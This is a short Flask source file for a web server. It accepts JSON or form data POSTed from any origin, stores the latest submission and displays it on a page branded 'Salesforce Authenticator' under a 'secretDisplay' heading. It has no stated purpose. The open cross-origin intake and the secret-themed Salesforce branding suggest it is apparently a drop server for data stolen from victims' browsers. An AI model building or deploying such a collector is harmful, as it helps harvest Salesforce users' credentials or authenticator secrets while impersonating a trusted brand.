from flask import Flask, request, jsonify, render_template_string
import json

app = Flask(__name__)

latest_payload = {}

@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST'
    return response

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Salesforce Authenticator</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            font-family: sans-serif;
        }
        .top-bar {
            background-color: #f4f4f4;
            padding: 10px;
            text-align: center;
            box-shadow: 0px 2px 5px rgba(0,0,0,0.1);
        }
        #secretDisplay {
            padding: 20px;
            font-family: monospace;
            background-color: #fafafa;
            border-top: 1px solid #ddd;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="top-bar">
        <h2>Salesforce Authenticator</h2>
    </div>

    <div id="secretDisplay">{{ data }}</div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def home():
    global latest_payload

    if request.method == 'POST':
        try:
            latest_payload = request.get_json(force=True)
            print("✅ JSON received:", latest_payload)
        except Exception:
            latest_payload = request.form.to_dict()
            print("⚠️ Fallback to form:", latest_payload)

        return jsonify({"message": "Data received", "data": latest_payload}), 200

    # Display stored payload
    display = json.dumps(latest_payload, indent=2) if latest_payload else "No data submitted yet."
    return render_template_string(HTML_TEMPLATE, data=display)

if __name__ == '__main__':
    app.run(debug=True)
